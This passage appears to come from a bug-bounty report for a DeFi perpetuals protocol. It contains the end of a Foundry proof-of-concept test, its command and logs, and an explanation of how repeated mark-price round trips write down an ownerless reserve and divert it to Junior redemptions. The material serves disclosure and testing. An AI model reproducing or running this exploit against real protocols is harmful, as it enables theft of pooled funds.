            emit log_named_uint("cycle", cycle + 1);
            emit log_named_uint("  unassignedAssets", ownerlessNow);
            emit log_named_uint("  reserve lost this cycle", previousOwnerless - ownerlessNow);
            emit log_named_uint("  Junior cash claimed this cycle", paid);
            assertLe(ownerlessNow, previousOwnerless, "the reserve never recovers");
            previousOwnerless = ownerlessNow;

            vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        }

        emit log_named_uint("total reserve lost over 4 cycles", ownerlessStart - pool.unassignedAssets());
        emit log_named_uint("total Junior cash claimed", cumulativePaid);
        emit log_named_uint("total attacking trader cost", traderStart - clearinghouse.balanceAssets(attacker));
        assertGt(ownerlessStart - pool.unassignedAssets(), 0, "cumulative reserve loss");
    }
}
```

Command:

```
cd packages/perps && forge test --match-path 'test/bounty/ownerless/OwnerlessReserveReboundToJunior.t.sol' -vv
```

Output:

```
Ran 2 tests for test/bounty/ownerless/OwnerlessReserveReboundToJunior.t.sol:OwnerlessReserveReboundToJunior
[PASS] test_ownerlessReserveReboundIsCreditedToJunior() (gas: 426148533)
Logs:
  ordinary 1% precursor rounds: 56
  owner recapitalization, exact Senior gap: 1089116807978
  unassignedAssets after the routine cure and revenue: 998784000000
  counterfactual Junior payout, no adverse settlement: 79789964
  unassignedAssets after the adverse mark: 996985243989
  Junior payout after the rebound: 1878545975
  attacking trader round-trip cost: 160240138
  ownerless reserve written down: 1798756011
  extra Junior payout versus the counterfactual: 1798756011

[PASS] test_repeatedMarkRoundTripsRatchetTheReserveDown() (gas: 437054014)
Logs:
  ordinary 1% precursor rounds: 56
  owner recapitalization, exact Senior gap: 1089116807978
  unassignedAssets after the routine cure and revenue: 998784000000
  cycle: 1
    unassignedAssets: 996985243989
    reserve lost this cycle: 1798756011
    Junior cash claimed this cycle: 939397981
  cycle: 2
    unassignedAssets: 996126058584
    reserve lost this cycle: 859185405
    Junior cash claimed this cycle: 939311711
  cycle: 3
    unassignedAssets: 995266959834
    reserve lost this cycle: 859098750
    Junior cash claimed this cycle: 939225207
  cycle: 4
    unassignedAssets: 994407947971
    reserve lost this cycle: 859011863
    Junior cash claimed this cycle: 939138375
  total reserve lost over 4 cycles: 4376052029
  total Junior cash claimed: 3757073274
  total attacking trader cost: 640961176

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Amounts are six-decimal USDG atoms. The gas figures cover each whole test, including setup, the 56 precursor trading rounds, the owner recovery, and the counterfactual branch; they are not attack gas estimates.

Reading the primary test: 56 rounds of valid one percent basket moves wipe Junior principal and open a 1,089,116.807978 USDG Senior high-water gap. The owner recapitalizes for exactly that gap. Sixteen ordinary round trips by an unrelated trader restore part of Senior before the recapitalization is allocated, so 998,784.000000 USDG of the owner's funding has no claimant and is quarantined. The Senior LP exits normally. A newly funded trader, separate from every precursor account, opens a 200,000-notional Short at 1.00. The incumbent Junior holder queues a redemption and lets it mature.

From that single state the test runs both branches. Closing at the entry mark first leaves `unassignedAssets` at 998,784.000000 and pays the Junior holder 79.789964 USDG of ordinary round-trip revenue. A public settlement at 1.01 first reduces `unassignedAssets` to 996,985.243989 and refunds the zero-value request; the position then closes at 1.00 with `lastMarkPrice` back at `1e8` and `totalTraderClaimBalanceAssets` at zero, and the Junior holder is paid 1,878.545975 USDG. The difference between the branches is 1,798.756011 USDG, equal to the reserve reduction to the atom. The test also asserts the asymmetry directly: Senior principal, wiped by the same mark, is back at its exact pre-mark value on the rebound, while `unassignedAssets` stays at its written-down value.
